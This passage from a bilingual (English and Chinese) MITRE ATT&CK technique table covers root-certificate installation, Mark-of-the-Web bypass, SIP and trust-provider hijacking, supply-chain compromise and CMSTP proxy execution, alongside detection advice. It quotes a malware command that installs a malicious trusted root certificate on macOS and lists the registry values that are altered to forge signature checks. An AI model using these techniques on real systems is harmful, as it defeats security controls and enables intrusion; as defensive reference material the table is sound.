Brandon Dalton) 从 USB 闪存驱动器、光盘、外部硬盘驱动器、通过本地网络共享的驱动器或使用 curl 命令加载到系统上的应用程序和文件可能不会设置隔离标志。此外，可以使用 [Drive-by Compromise] (https://attack.mitre.org/techniques/T1189) 来避免设置隔离标志。
T1553.004,Subvert Trust Controls: Install Root Certificate,"Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.(Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.

Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.(Citation: Operation Emmental)

Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) capability for intercepting information transmitted over secure TLS/SSL communications.(Citation: Kaspersky Superfish)

Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.(Citation: SpectorOps Code Signing Dec 2017)

In macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain.(Citation: objective-see ay mami 2018)",https://attack.mitre.org/techniques/T1553/004,21 February 2020,25 August 2021,1.1,Defense Evasion,"A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity.(Citation: SpectorOps Code Signing Dec 2017) Check pre-installed certificates on new systems to ensure unnecessary or suspicious certificates are not present. Microsoft provides a list of trustworthy root certificates online and through authroot.stl.(Citation: SpectorOps Code Signing Dec 2017) The Sysinternals Sigcheck utility can also be used (<code>sigcheck[64].exe -tuv</code>) to dump the contents of the certificate store and list valid certificates not rooted to the Microsoft Certificate Trust List.(Citation: Microsoft Sigcheck May 2017)

Installed root certificates are located in the Registry under <code>HKLM\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates\</code> and <code>[HKLM or HKCU]\Software[\Policies\]\Microsoft\SystemCertificates\Root\Certificates\</code>. There are a subset of root certificates that are consistent across Windows systems and can be used for comparison:(Citation: Tripwire AppUNBlocker)

* 18F7C1FCC3090203FD5BAA2F861A754976C8DD25
* 245C97DF7514E7CF2DF8BE72AE957B9E04741E85
* 3B1EFD3A66EA28B16697394703A72CA340A05BD5
* 7F88CD7223F3C813818C994614A89C99FA3B5247
* 8F43288AD272F3103B6FB1428485EA3014C0BCFE
* A43489159A520F0D93D032CCAF37E7FE20A8B419
* BE36A4562FB2EE05DBB3D32323ADF445084ED656
* CDD4EEAE6000AC7F40C3802C171E30148030C072","Linux, Windows, macOS","Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification",True,T1553,Digital Certificate Validation,"Itzik Kotler, SafeBreach; Matt Graeber, @mattifestation, SpecterOps; Red Canary; Travis Smith, Tripwire","Administrator, User",,,CAPEC-479,,,"(Citation: objsee mac malware 2017),(Citation: FireEye HIKIT Rootkit Part 2),(Citation: Palo Alto Retefe),(Citation: hexed osx.dok analysis 2019),(Citation: Unit42 Redaman January 2019),(Citation: ESET RTM Feb 2017),(Citation: SpectorOps Code Signing Dec 2017),(Citation: Wikipedia HPKP)",破坏信任控制：安装根证书,攻击者可能会在受感染的系统上安装根证书，以避免在连接到攻击者控制的 Web 服务器时出现警告。根证书在公钥加密中用于标识根证书颁发机构 (CA)。安装根证书后，系统或应用程序将信任根信任链中已由根证书签名的证书。（引用：维基百科根证书）证书通常用于在 Web 中建立安全的 TLS/SSL 通信浏览器。当用户尝试浏览提供不受信任的证书的网站时，将显示错误消息以警告用户安全风险。根据安全设置，浏览器可能不允许用户建立与网站的连接。在受感染的系统上安装根证书会给攻击者一种降低该系统安全性的方法。攻击者使用这种技术来避免安全警告提示用户，当受感染的系统通过 HTTPS 连接到攻击者控制的网络服务器时，这些服务器会欺骗合法网站以收集登录凭据。（引用：Operation Emmental）非典型根证书也已预安装在系统上由制造商或在软件供应链中使用，并与恶意软件/广告软件一起使用，以提供 [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) 拦截通过安全的 TLS/SSL 通信。（引用：Kaspersky Superfish）根证书（及其关联的链）也可以克隆和重新安装。克隆的证书链将携带许多与源相同的元数据特征，可用于签署恶意代码，然后可能绕过用于阻止执行和/或发现持久性工件的签名验证工具（例如：Sysinternals、防病毒等） .(Citation: SpectorOps Code Signing Dec 2017) 在 macOS 中，Ay MaMi 恶意软件使用 <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/ to/malicious/cert</code> 将恶意证书作为受信任的根证书安装到系统钥匙串中。（引用：objective-see ay mami 2018）
T1553.005,Subvert Trust Controls: Mark-of-the-Web Bypass,"Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named <code>Zone.Identifier</code> with a specific value known as the MOTW.(Citation: Microsoft Zone.Identifier 2020) Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file in not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)(Citation: Intezer Russian APT Dec 2020)

Adversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)",https://attack.mitre.org/techniques/T1553/005,22 February 2021,05 May 2022,1.1,Defense Evasion,"Monitor compressed/archive and image files downloaded from the Internet as the contents may not be tagged with the MOTW. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities.(Citation: Disable automount for ISO)",Windows,"File: File Creation, File: File Metadata",True,T1553,"Anti-virus, Application Control","Christiaan Beek, @ChristiaanBeek",,,,,,,"(Citation: Korean FSI TA505 2020),(Citation: ESET T3 Threat Report 2021),(Citation: TrendMicro TA505 Aug 2019),(Citation: GitHub MOTW),(Citation: Dormann Dangers of VHD 2019)",破坏信任控制：Web 标记绕过,攻击者可能会滥用特定的文件格式来破坏 Web 标记 (MOTW) 控件。在 Windows 中，当从 Internet 下载文件时，它们会被一个名为 <code>Zone.Identifier</code> 的隐藏 NTFS 备用数据流 (ADS) 标记，其特定值称为 MOTW。（引文：Microsoft Zone。标识符 2020) 带有 MOTW 标记的文件受到保护，无法执行某些操作。例如，从 MS Office 10 开始，如果 MS Office 文件具有 MOTW，它将在受保护的视图中打开。带有 MOTW 标记的可执行文件将由 Windows Defender SmartScreen 处理，它将文件与知名可执行文件的许可列表进行比较。如果文件未知/不可信，SmartScreen 将阻止执行并警告用户不要运行它。（引用：Beek Use of VHD Dec 2020）（引用：Outflank MotW 2020）（引用：Intezer Russian APT Dec 2020）对手可能会滥用容器文件，例如压缩/存档（.arj、.gzip）和/或磁盘映像（.iso、.vhd）文件格式来传递可能未使用 MOTW 标记的恶意负载。从 Internet 下载的容器文件将标有 MOTW，但在提取和/或挂载容器文件后，其中的文件可能不会继承 MOTW。 MOTW 是 NTFS 功能，许多容器文件不支持 NTFS 替代数据流。提取和/或装载容器文件后，其中包含的文件可能会被视为磁盘上的本地文件并在没有保护的情况下运行。（引用：Beek Use of VHD Dec 2020）（引用：Outflank MotW 2020）
T1553.003,Subvert Trust Controls: SIP and Trust Provider Hijacking,"Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017)

Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)

Similar to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)

* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\SOFTWARE[\WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{SIP_GUID}</code> that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value to all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).
* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{SIP_GUID}</code> that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.
* Modifying the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\Providers\Trust\FinalPolicy\{trust provider GUID}</code> that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).
* **Note:** The above hijacks are also possible without modifying the Registry via [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).

Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)",https://attack.mitre.org/techniques/T1553/003,05 February 2020,05 May 2022,1.0,Defense Evasion,"Periodically baseline registered SIPs and trust providers (Registry entries and files on disk), specifically looking for new, modified, or non-Microsoft entries. (Citation: SpectorOps Subverting Trust Sept 2017)

Enable CryptoAPI v2 (CAPI) event logging (Citation: Entrust Enable CAPI2 Aug 2017) to monitor and analyze error events related to failed trust validation (Event ID 81, though this event can be subverted by hijacked trust provider components) as well as any other provided information events (ex: successful validations). Code Integrity event logging may also provide valuable indicators of malicious SIP or trust provider loads, since protected processes that attempt to load a maliciously-crafted trust validation component will likely fail (Event ID 3033). (Citation: SpectorOps Subverting Trust Sept 2017)

Utilize Sysmon detection rules and/or enable the Registry (Global Object Access Auditing) (Citation: Microsoft Registry Auditing Aug 2016) setting in the Advanced Security Audit policy to apply a global system access control list (SACL) and event auditing on modifications to Registry values (sub)keys related to SIPs and trust providers: (Citation: Microsoft Audit Registry July 2012)

* HKLM\SOFTWARE\Microsoft\Cryptography\OID
* HKLM\SOFTWARE\WOW6432Node\Microsoft\Cryptography\OID
* HKLM\SOFTWARE\Microsoft\Cryptography\Providers\Trust
* HKLM\SOFTWARE\WOW6432Node\Microsoft\Cryptography\Providers\Trust

**Note:** As part of this technique, adversaries may attempt to manually edit these Registry keys (ex: Regedit) or utilize the legitimate registration process using [Regsvr32](https://attack.mitre.org/techniques/T1218/010). (Citation: SpectorOps Subverting Trust Sept 2017)

Analyze Autoruns data for oddities and anomalies, specifically malicious files attempting persistent execution by hiding within auto-starting locations. Autoruns will hide entries signed by Microsoft or Windows by default, so ensure “Hide Microsoft Entries” and “Hide Windows Entries” are both deselected. (Citation: SpectorOps Subverting Trust Sept 2017)",Windows,"File: File Modification, Module: Module Load, Windows Registry: Windows Registry Key Modification",True,T1553,"Application Control, Autoruns Analysis, Digital Certificate Validation, User Mode Signature Validation","Matt Graeber, @mattifestation, SpecterOps",,,,,,,",",破坏信任控制：SIP 和信任提供者劫持,在进行签名验证检查时，攻击者可能会篡改 SIP 和信任提供程序组件，从而误导操作系统和应用程序控制工具。在用户模式下，Windows Authenticode（引用：Microsoft Authenticode）数字签名用于验证文件的来源和完整性，这些变量可用于建立对签名代码的信任（例如：具有有效 Microsoft 签名的驱动程序可能被视为安全）。签名验证过程通过 WinVerifyTrust 应用程序编程接口 (API) 函数（引用：Microsoft WinVerifyTrust）处理，该函数接受查询并与负责验证签名参数的适当信任提供者协调。 （引用：SpectorOps Subverting Trust 2017 年 9 月）由于可执行文件类型和相应的签名格式不同，Microsoft 创建了称为主题接口包 (SIP) 的软件组件（引用：EduardosBlog SIP，2008 年 7 月），以在 API 函数和文件。 SIP 负责启用 API 函数来创建、检索、计算和验证签名。大多数文件格式（可执行文件、PowerShell、安装程序等）都存在唯一 SIP，目录签名提供包罗万象（引用：Microsoft 目录文件和签名，2017 年 4 月）），并由全球唯一标识符 (GUID) 标识。 （引用：SpectorOps 颠覆信任 2017 年 9 月）与 [代码签名](https://attack.mitre.org/techniques/T1553/002) 类似，攻击者可能会滥用此架构来颠覆信任控制并绕过仅允许合法使用的安全策略在系统上执行的签名代码。攻击者可能会劫持 SIP 和信任提供程序组件，以误导操作系统和应用程序控制工具将恶意（或任何）代码分类为由以下人员签名：（引文：SpectorOps Subverting Trust 2017 年 9 月）* 修改 <code>Dll</code> 和 < code>FuncName</code> <code>HKLM\SOFTWARE[\WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{SIP_GUID}</code> 中的注册表值指向提供的动态链接库 (DLL) SIP 的 CryptSIPDllGetSignedDataMsg 函数，该函数从签名文件中检索编码的数字证书。通过指向一个带有导出函数的恶意制作的 DLL，该函数总是返回一个已知的良好签名值（例如：Microsoft 可移植可执行文件的签名）而不是文件的真实签名，攻击者可以使用该函数将可接受的签名值应用于所有文件SIP（引用：GitHub SIP POC 2017 年 9 月）（尽管可能会发生哈希不匹配，使签名无效，因为函数返回的哈希与从文件计算的值不匹配）。 * 修改注册表值 <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{SIP_GUID}</code> 中的 <code>Dll</code> 和 <code>FuncName</code> 指向提供 SIP 的 CryptSIPDllVerifyIndirectData 函数的 DLL，该函数根据签名的哈希值验证文件的计算哈希值。通过指向具有始终返回 TRUE（表示验证成功）的导出函数的恶意制作的 DLL，攻击者可以使用该 SIP 成功验证任何文件（具有合法签名）（引用：GitHub SIP POC 2017 年 9 月） （有或没有劫持前面提到的 CryptSIPDllGetSignedDataMsg 函数）。此注册表值也可以从已经存在的 DLL 重定向到合适的导出函数，从而避免在磁盘上删除和执行新文件的要求。 * 修改注册表值 <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\Providers\Trust\FinalPolicy\{trust provider GUID}</code>  中的 <code>DLL</code> 和 <code>Function</code> 指向提供信任提供程序的 FinalPolicy 函数的 DLL，在该函数中检查解码和解析的签名并做出大多数信任决策。与劫持 SIP 的 CryptSIPDllVerifyIndirectData 函数类似，该值可以从已经存在的 DLL 或恶意制作的 DLL 重定向到合适的导出函数（尽管信任提供者的实现很复杂）。 * **注意：**上述劫持也可以通过[DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001)在不修改注册表的情况下进行。劫持 SIP 或信任提供者组件还可以启用持久代码执行，因为这些恶意组件可能被执行代码签名或签名验证的任何应用程序调用。 （引文：SpectorOps 颠覆信任，2017 年 9 月）
T1195,Supply Chain Compromise,"Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.

Supply chain compromise can take place at any stage of the supply chain including:

* Manipulation of development tools
* Manipulation of a development environment
* Manipulation of source code repositories (public or private)
* Manipulation of source code in open-source dependencies
* Manipulation of software update/distribution mechanisms
* Compromised/infected system images (multiple cases of removable media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware) 
* Replacement of legitimate software with modified versions
* Sales of modified/counterfeit products to legitimate distributors
* Shipment interdiction

While supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil 2018)(Citation: Command Five SK 2011) Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)",https://attack.mitre.org/techniques/T1195,18 April 2018,28 April 2022,1.5,Initial Access,Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity. Perform physical inspection of hardware to look for potential tampering.,"Linux, Windows, macOS","File: File Metadata, Sensor Health: Host Status",False,,,Veeral Patel,,,,"CAPEC-437, CAPEC-438, CAPEC-439",,,",(Citation: OWASP Top 10)",供应链攻击,攻击者可能会在最终消费者收到之前操纵产品或产品交付机制，以破坏数据或系统。供应链妥协可以发生在供应链的任何阶段，包括： * 开发工具的操纵 * 开发环境的操纵 * 源代码存储库（公共或私有）的操纵 * 开源依赖项中的源代码的操纵 * 操纵软件更新/分发机制 * 受损/受感染的系统映像（工厂感染的多个可移动媒体案例）（引用：IBM Storwize）（引用：施耐德电气 USB 恶意软件） * 用修改版本替换合法软件 * 销售修改/伪造向合法分销商提供产品 * 禁止发货 虽然供应链受损可能会影响硬件或软件的任何组件，但希望获得执行权的对手通常将注意力集中在软件分发或更新渠道中对合法软件的恶意添加上。（引文：Avast CCleaner3 2018）（引文: Microsoft Dofoil 2018)(Citation: Command Five SK 2011) 目标可能是 s特定于所需受害者集或恶意软件可能会分发给广大消费者，但只会针对特定受害者采取其他策略。（引文：Symantec Elderwood 2012 年 9 月）（引文：Avast CCleaner3 2018）（引文：Command Five SK 2011）在许多应用程序中用作依赖项的流行开源项目也可能成为向依赖项的用户添加恶意代码的一种手段。（引用：Trendmicro NPM Compromise）
T1195.003,Supply Chain Compromise: Compromise Hardware Supply Chain,"Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.",https://attack.mitre.org/techniques/T1195/003,11 March 2020,28 April 2022,1.1,Initial Access,Perform physical inspection of hardware to look for potential tampering. Perform integrity checking on pre-OS boot mechanisms that can be manipulated for malicious purposes.,"Linux, Windows, macOS",Sensor Health: Host Status,True,T1195,,,,,,,,,",(Citation: TCG Trusted Platform Module),(Citation: TechNet Secure Boot Process)",供应链攻击：篡改硬件供应链,攻击者可能会在最终消费者收到产品之前操纵产品中的硬件组件，以达到数据或系统危害的目的。通过修改供应链中的硬件或固件，攻击者可以将后门插入可能难以检测到的消费者网络中，并使攻击者对系统具有高度控制权。硬件后门可以插入到各种设备中，例如服务器、工作站、网络基础设施或外围设备。
T1195.001,Supply Chain Compromise: Compromise Software Dependencies and Development Tools,"Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)  

Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. ",https://attack.mitre.org/techniques/T1195/001,11 March 2020,28 April 2022,1.1,Initial Access,Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity. ,"Linux, Windows, macOS",File: File Metadata,True,T1195,,,,,,,,,"(Citation: trendmicro xcsset xcode project 2020),(Citation: OWASP Top 10)",供应链攻击：篡改软件依赖和开发工具,攻击者可能会在最终消费者收到之前操纵软件依赖关系和开发工具，以达到数据或系统危害的目的。应用程序通常依赖外部软件才能正常运行。在许多应用程序中用作依赖项的流行开源项目可能会成为向依赖项的用户添加恶意代码的一种手段。（引用：Trendmicro NPM Compromise）目标可能特定于所需的受害者集，也可能分发给广泛的消费者，但只针对特定受害者采取其他策略。
T1195.002,Supply Chain Compromise: Compromise Software Supply Chain,"Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.

Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011)  ",https://attack.mitre.org/techniques/T1195/002,11 March 2020,28 April 2022,1.1,Initial Access,Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity. ,"Linux, Windows, macOS",File: File Metadata,True,T1195,,,,,,,,,"(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: Talos CCleanup 2017),(Citation: Secureworks NotPetya June 2017),(Citation: Secureworks GOLD SOUTHFIELD),(Citation: MSTIC Nobelium Oct 2021),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: Secureworks REvil September 2019),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Trustwave GoldenSpy June 2020),(Citation: Secureworks IRON RITUAL Profile),(Citation: Avast CCleaner3 2018),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: Intezer Aurora Sept 2017),(Citation: FireEye APT41 Aug 2019),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Secureworks IRON LIBERTY July 2019),(Citation: Gigamon Berserk Bear October 2021),(Citation: ESET Telebots June 2017),(Citation: OWASP Top 10)",供应链攻击：篡改软件供应链,攻击者可能会在最终消费者收到之前操纵应用程序软件，以破坏数据或系统。软件供应链的危害可以通过多种方式发生，包括操纵应用程序源代码、操纵该软件的更新/分发机制，或用修改版本替换已编译的版本。定位可能特定于所需的受害者群体，也可能分发给广泛的消费者群体，但只会针对特定受害者采取其他策略。（引文：Avast CCleaner3 2018）（引文：Command Five SK 2011）
T1218,System Binary Proxy Execution,"Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.

Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)",https://attack.mitre.org/techniques/T1218,18 April 2018,18 April 2022,3.0,Defense Evasion,"Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Compare recent invocations of signed binaries that may be used to proxy execution with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the Internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.

Monitor for file activity (creations, downloads, modifications, etc.), especially for file types that are not typical within an environment and may be indicative of adversary activity.","Linux, Windows, macOS","Command: Command Execution, File: File Creation, Module: Module Load, Network Traffic: Network Connection Creation, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Modification",False,,"Anti-virus, Application control, Digital Certificate Validation","Hans Christoffer Gaardløs; Nishan Maharjan, @loki248; Praetorian; Wes Hurd",,,,,,,"(Citation: Lazarus APT January 2022),(Citation: Qualys LolZarus),",系统二进制代理执行/利用已签名的二进制文件代理执行,攻击者可以通过使用签名或以其他方式受信任的二进制文件代理恶意内容的执行来绕过基于进程和/或签名的防御。此技术中使用的二进制文件通常是 Microsoft 签名的文件，表明它们要么是从 Microsoft 下载的，要么已经是操作系统中的本地文件。（引用：LOLBAS 项目）使用受信任的数字证书签名的二进制文件通常可以在受保护的 Windows 系统上执行数字签名验证。 Windows 安装中默认的几个 Microsoft 签名二进制文件可用于代理其他文件或命令的执行。同样，在 Linux 系统上，攻击者可能会滥用受信任的二进制文件，例如 <code>split</code> 来代理恶意命令的执行。（引用：拆分手册页）（引用：GTFO 拆分）
T1218.003,System Binary Proxy Execution: CMSTP,"Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.

Adversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.

CMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)",https://attack.mitre.org/techniques/T1218/003,23 January 2020,11 March 2022,2.0,Defense Evasion,"Use process monitoring to detect and analyze the execution and arguments of CMSTP.exe. Compare recent invocations of CMSTP.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity.

Sysmon events can also be used to identify potential abuses of CMSTP.exe. Detection strategy may depend on the specific adversary procedure, but potential rules include: (Citation: Endurant CMSTP July 2018)

* To detect loading and execution of local/remote payloads - Event 1 (Process creation) where ParentImage contains CMSTP.exe and/or Event 3 (Network connection) where Image contains CMSTP.exe and DestinationIP is external.
* To detect [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) via an auto-elevated COM interface - Event 10 (ProcessAccess) where CallTrace contains CMLUA.dll and/or Event 12 or 13 (RegistryEvent) where TargetObject contains CMMGR32.exe. Also monitor for events, such as the creation of processes (Sysmon Event 1), that involve auto-elevated CMSTP COM interfaces such as CMSTPLUA (3E5FC7F9-9A51-4367-9063-A120244FBEC7) and CMLUAUTIL (3E000D72-A845-4CD9-BD83-80C07C3B881F).",Windows,"Command: Command Execution, Network Traffic: Network Connection Creation, Process: Process Creation",True,T1218,"Anti-virus, Application control","Nik Seetharaman, Palantir; Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank",User,,,,,,"(Citation: Morphisec Cobalt Gang Oct 2018),(Citation: Talos Cobalt Group July 2018),(Citation: Unit 42 Cobalt Gang Oct 2018),(Citation: FireEye MuddyWater Mar 2018),",系统二进制代理执行/利用已签名的二进制文件代理执行：CMSTP,攻击者可能会滥用 CMSTP 来代理恶意代码的执行。 Microsoft Connection Manager Profile Installer (CMSTP.exe) 是一个命令行程序，用于安装 Connection Manager 服务配置文件。 （引用：Microsoft Connection Manager Oct 2009）CMSTP.exe 接受安装信息文件 (INF) 作为参数，并安装用于远程访问连接的服务配置文件。攻击者可能会向 CMSTP.exe 提供感染了恶意命令的 INF 文件。 （引文：Twitter CMSTP Usage Jan 2018）类似于 [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/“Squiblydoo”，CMSTP.exe 可能被滥用来加载和执行 DLL（引文： MSitPros CMSTP 2017 年 8 月）和/或来自远程服务器的 COM 脚本 (SCT)。 （引用：Twitter CMSTP 2018 年 1 月）（引用：GitHub Ultimate AppLocker 绕过列表）（引用：Endurant CMSTP 2018 年 7 月）此执行还可能绕过 AppLocker 和其他应用程序控制防御，因为 CMSTP.exe 是可能由 Microsoft 